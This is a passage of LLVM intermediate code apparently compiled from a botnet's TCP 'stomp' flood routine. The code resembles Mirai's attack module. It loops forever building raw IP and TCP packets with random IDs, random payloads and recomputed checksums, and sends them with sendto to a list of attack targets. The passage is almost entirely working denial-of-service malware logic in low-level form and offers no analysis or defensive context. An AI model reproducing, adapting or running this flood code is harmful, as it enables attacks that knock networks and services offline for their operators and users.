  br i1 %433, label %434, label %437

434:                                              ; preds = %429, %424
  %435 = load i32, i32* %26, align 4
  %436 = call i32 @close(i32 %435)
  br label %133

437:                                              ; preds = %429
  br label %438

438:                                              ; preds = %437
  br label %439

439:                                              ; preds = %438, %229
  br label %440

440:                                              ; preds = %439, %225, %217
  %441 = call i32 @time(i32* null)
  %442 = load i32, i32* %31, align 4
  %443 = sub nsw i32 %441, %442
  %444 = icmp sgt i32 %443, 10
  br i1 %444, label %445, label %448

445:                                              ; preds = %440
  %446 = load i32, i32* %26, align 4
  %447 = call i32 @close(i32 %446)
  br label %133

448:                                              ; preds = %440
  br label %205

449:                                              ; preds = %342, %205
  br label %450

450:                                              ; preds = %449, %138
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  br label %128

453:                                              ; preds = %128
  br label %454

454:                                              ; preds = %561, %453
  %455 = load i32, i32* @TRUE, align 4
  %456 = icmp ne i32 %455, 0
  br i1 %456, label %457, label %562

457:                                              ; preds = %454
  store i32 0, i32* %9, align 4
  br label %458

458:                                              ; preds = %558, %457
  %459 = load i32, i32* %9, align 4
  %460 = load i32, i32* %5, align 4
  %461 = icmp slt i32 %459, %460
  br i1 %461, label %462, label %561

462:                                              ; preds = %458
  %463 = load i8**, i8*** %12, align 8
  %464 = load i32, i32* %9, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds i8*, i8** %463, i64 %465
  %467 = load i8*, i8** %466, align 8
  store i8* %467, i8** %37, align 8
  %468 = load i8*, i8** %37, align 8
  %469 = bitcast i8* %468 to %struct.iphdr*
  store %struct.iphdr* %469, %struct.iphdr** %38, align 8
  %470 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i64 1
  %472 = bitcast %struct.iphdr* %471 to %struct.tcphdr*
  store %struct.tcphdr* %472, %struct.tcphdr** %39, align 8
  %473 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i64 1
  %475 = bitcast %struct.tcphdr* %474 to i8*
  store i8* %475, i8** %40, align 8
  %476 = load i32, i32* %14, align 4
  %477 = icmp eq i32 %476, 65535
  br i1 %477, label %478, label %483

478:                                              ; preds = %462
  %479 = call i32 (...) @rand_next()
  %480 = and i32 %479, 65535
  %481 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 3
  store i32 %480, i32* %482, align 4
  br label %483

483:                                              ; preds = %478, %462
  %484 = load i8*, i8** %25, align 8
  %485 = icmp ne i8* %484, null
  br i1 %485, label %486, label %490

486:                                              ; preds = %483
  %487 = load i8*, i8** %40, align 8
  %488 = load i32, i32* %24, align 4
  %489 = call i32 @rand_str(i8* %487, i32 %488)
  br label %490

490:                                              ; preds = %486, %483
  %491 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 6
  store i64 0, i64* %492, align 8
  %493 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %494 = bitcast %struct.iphdr* %493 to i32*
  %495 = call i64 @checksum_generic(i32* %494, i32 64)
  %496 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 6
  store i64 %495, i64* %497, align 8
  %498 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %501, i32 0, i32 1
  %503 = load i32, i32* %502, align 8
  %504 = add nsw i32 %503, 1
  store i32 %504, i32* %502, align 8
  %505 = call i8* @htons(i32 %503)
  %506 = ptrtoint i8* %505 to i32
  %507 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 2
  store i32 %506, i32* %508, align 8
  %509 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %510 = load i32, i32* %9, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %509, i64 %511
  %513 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %512, i32 0, i32 2
  %514 = load i32, i32* %513, align 4
  %515 = call i8* @htons(i32 %514)
  %516 = ptrtoint i8* %515 to i32
  %517 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 3
  store i32 %516, i32* %518, align 4
  %519 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %520 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %519, i32 0, i32 8
  store i64 0, i64* %520, align 8
  %521 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %522 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %523 = load i32, i32* %24, align 4
  %524 = sext i32 %523 to i64
  %525 = add i64 72, %524
  %526 = trunc i64 %525 to i32
  %527 = call i8* @htons(i32 %526)
  %528 = load i32, i32* %24, align 4
  %529 = sext i32 %528 to i64
  %530 = add i64 72, %529
  %531 = trunc i64 %530 to i32
  %532 = call i64 @checksum_tcpudp(%struct.iphdr* %521, %struct.tcphdr* %522, i8* %527, i32 %531)
  %533 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %534 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %533, i32 0, i32 8
  store i64 %532, i64* %534, align 8
  %535 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 4
  %537 = load i32, i32* %536, align 8
  %538 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %539 = load i32, i32* %9, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %538, i64 %540
  %542 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %541, i32 0, i32 2
  %543 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %542, i32 0, i32 0
  store i32 %537, i32* %543, align 4
  %544 = load i32, i32* %10, align 4
  %545 = load i8*, i8** %37, align 8
  %546 = load i32, i32* %24, align 4
  %547 = sext i32 %546 to i64
  %548 = add i64 136, %547
  %549 = trunc i64 %548 to i32
  %550 = load i32, i32* @MSG_NOSIGNAL, align 4
  %551 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %554, i32 0, i32 2
  %556 = bitcast %struct.TYPE_3__* %555 to %struct.sockaddr*
  %557 = call i32 @sendto(i32 %544, i8* %545, i32 %549, i32 %550, %struct.sockaddr* %556, i32 24)
  br label %558

558:                                              ; preds = %490
  %559 = load i32, i32* %9, align 4
  %560 = add nsw i32 %559, 1
  store i32 %560, i32* %9, align 4
  br label %458

561:                                              ; preds = %458
  br label %454

562:                                              ; preds = %117, %124, %216, %454
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @fcntl(i32, i32, i32) #1

declare dso_local i64 @htonl(i8*) #1

declare dso_local i8* @ntohl(i32) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @recvfrom(i32, i8*, i32, i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @rand_str(i8*, i32) #1

declare dso_local i64 @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.tcphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
